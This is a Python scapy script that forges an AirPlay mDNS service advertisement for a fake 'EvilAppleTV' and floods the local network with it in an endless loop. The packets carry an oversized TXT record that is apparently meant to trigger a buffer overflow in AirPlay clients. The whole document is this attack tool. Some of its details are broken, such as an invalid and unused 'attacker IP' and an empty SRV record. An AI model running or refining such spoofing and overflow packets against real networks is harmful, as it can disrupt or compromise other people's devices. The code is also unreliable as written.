from scapy.all import *
import time

# Set your attacker IP and interface
attacker_ip = "192.618.6.111"
iface = "wlan0"

# Build malformed mDNS TXT
txt_records = [
    b"model=AppleTV3,2",
    b"deviceid=aa:bb:cc:dd:ee:ff",
    b"features=0x100029ff",  # normal
    b"oversized=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"  # overflow?
]

# Create mDNS (multicast DNS) packet
dns = DNS(
    id=0,
    qr=0,
    opcode=0,
    qdcount=1,
    ancount=1,
    qd=DNSQR(qname="_airplay._tcp.local", qtype="PTR"),
    an=DNSRR(
        rrname="_airplay._tcp.local",
        type="PTR",
        rclass=0x8001,
        ttl=120,
        rdata="EvilAppleTV._airplay._tcp.local"
    )
)

# Send with malformed TXT records
pkt = (
    Ether(dst="ff:ff:ff:ff:ff:ff") /
    IP(dst="224.0.0.251") /
    UDP(sport=5353, dport=5353) /
    dns /
    DNSRR(
        rrname="EvilAppleTV._airplay._tcp.local",
        type="SRV",
        ttl=120,
        rclass=1,
        rdlen=0,
        rdata="\x00\x00\x00\x00"
    ) /
    DNSRR(
        rrname="EvilAppleTV._airplay._tcp.local",
        type="TXT",
        ttl=120,
        rclass=1,
        rdata=b"\x00".join(txt_records)
    )
)

print("[*] Sending malformed AirPlay mDNS packet...")
sendp(pkt, iface=iface, loop=1, inter=2)
